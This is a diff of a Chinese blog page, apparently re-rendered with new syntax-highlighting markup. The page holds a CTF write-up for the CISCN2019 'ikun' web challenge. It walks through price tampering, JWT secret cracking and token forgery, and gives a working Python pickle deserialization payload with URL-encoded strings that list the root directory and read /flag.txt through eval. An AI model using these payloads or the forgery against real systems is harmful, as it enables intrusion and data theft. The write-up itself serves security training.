@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      790 字
+      784 字
     </span>
   
 
@@ -240,53 +248,53 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[CISCN2019 华北赛区 Day1 Web2]ikun<br><img src="https://ftp.bmp.ovh/imgs/2021/03/447a0694ccac2a24.png" srcset="/img/loading.gif">    </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有提示<br>在下面点下一页的话，URL就变成了<code>http://c472e76d-638c-4834-ae42-125f0a073ed7.node3.buuoj.cn/shop?page=2</code><br>写个脚本找LV6    </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
+<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):
-    time.sleep(<span class="hljs-number">0.1</span>)
-    url=<span class="hljs-string">&#x27;http://fc76ee12-4b8a-4064-9eb3-84b2e8a5c4f9.node3.buuoj.cn/shop?page=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)
-    r=requests.get(url=url)
-    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> r.text:
-        print(i)
-        <span class="hljs-keyword">break</span></code></pre></div></code></pre>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+    url<span class="token operator">=</span><span class="token string">'http://fc76ee12-4b8a-4064-9eb3-84b2e8a5c4f9.node3.buuoj.cn/shop?page=&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        <span class="token keyword">break</span></code></pre></code></pre>
 <p>在181页<br>注册账号，购买，结算时抓包改<code>discount</code>—然后发包      </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/03/010d17c39847ea49.png" srcset="/img/loading.gif"><br>接下来要改<code>JWT</code>了<br><img src="https://ftp.bmp.ovh/imgs/2021/03/14d76e68917280b2.png" srcset="/img/loading.gif">   </p>
 <p>JWT由Header、Payload、Signature三部分组成，中间以圆点(.)连接<br>前两部分均以base64编码<br><code>Signature=HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</code>        </p>
 <p>JWT破解工具——-&gt;<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a><br>用法：需要先<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/82361096">安装docker</a>;然后按照Github上的使用<br><img src="https://ftp.bmp.ovh/imgs/2021/03/b4eb75fe8f58961f.png" srcset="/img/loading.gif"><br>然后在<a target="_blank" rel="noopener" href="https://jwt.io/">这个网站</a>上生成新的JWT<br><img src="https://ftp.bmp.ovh/imgs/2021/03/2fcaed2eca6a14cc.png" srcset="/img/loading.gif"><br>修改—发包<br>在源码中发现<br><img src="https://ftp.bmp.ovh/imgs/2021/03/8f5846239e5ea5ed.png" srcset="/img/loading.gif"> </p>
 <p>然后是<code>Admin.py</code>里Pickle反序列化<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9badbf37f31eb602.png" srcset="/img/loading.gif">   </p>
 <p> <code>pickle.dump(obj,file,[,protocol])</code>   </p>
-<div class="hljs"><pre><code>函数的功能：将obj对象序列化存入已经打开的file中。
+<pre><code>函数的功能：将obj对象序列化存入已经打开的file中。
 obj：想要序列化的obj对象。
 file:文件名称。
-protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre></div>
+protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre>
 <p><code>pickle.load(file)</code>     </p>
-<div class="hljs"><pre><code>函数的功能：将file中的对象序列化读出。
-file：文件名称。</code></pre></div>
+<pre><code>函数的功能：将file中的对象序列化读出。
+file：文件名称。</code></pre>
 <p><code>pickle.dumps(obj[,protocol])</code>     </p>
-<div class="hljs"><pre><code>函数的功能：将obj对象序列化为string形式，而不是存入文件中。
+<pre><code>函数的功能：将obj对象序列化为string形式，而不是存入文件中。
 obj：想要序列化的obj对象。
-protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre></div>
+protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre>
 <p><code>pickle.loads(string)</code>     </p>
-<div class="hljs"><pre><code>函数的功能：从string中读出序列化前的obj对象。
+<pre><code>函数的功能：从string中读出序列化前的obj对象。
 string：文件名称。
-【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码     </code></pre></div>
+【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码     </code></pre>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/109708593?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&spm=1001.2101.3001.4242">转自</a>   </p>
 <p><code>__reduce__</code>魔法函数      </p>
-<div class="hljs"><pre><code>  __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么    返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）      </code></pre></div>
+<pre><code>  __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么    返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）      </code></pre>
 <p>上大佬的脚本：</p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
-<span class="hljs-keyword">import</span> urllib
-<span class="hljs-keyword">import</span> os
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>
-        <span class="hljs-keyword">return</span> (os.listdir,(<span class="hljs-string">&#x27;/&#x27;</span>,))   
+<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> urllib
+<span class="token keyword">import</span> os
+<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   
  
-a = pickle.dumps(payload())
-<span class="hljs-comment">###python3需要用下面的写法</span>
-<span class="hljs-comment">###a = pickle.dumps(payload(),protocol=0)</span>
-a = urllib.quote(a)
-<span class="hljs-built_in">print</span> a</code></pre></div></code></pre>
+a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">###python3需要用下面的写法</span>
+<span class="token comment">###a = pickle.dumps(payload(),protocol=0)</span>
+a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">print</span> a    </code></pre></code></pre>
 <p>python2下执行—<code>cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</code><br>点击<code>一键成为大会员</code>,抓包改<code>become</code>—-发包<br><img src="https://ftp.bmp.ovh/imgs/2021/03/cde243001d7f40fe.png" srcset="/img/loading.gif"><br>看到<code>flag.txt</code><br>return中改为<code>eval,(&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;)</code>打开<code>flag.txt</code>——-&gt;<code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/cdfd506f0aac1b38.png" srcset="/img/loading.gif"><br>但用<code>os.system,(&#39;cat /flag.txt&#39;,)</code>不行？？？     </p>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
 <li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html"><code>JWT</code></a> </li>
@@ -436,6 +444,8 @@ a = urllib.quote(a)
 
 
 
+  
+    
   
 
 
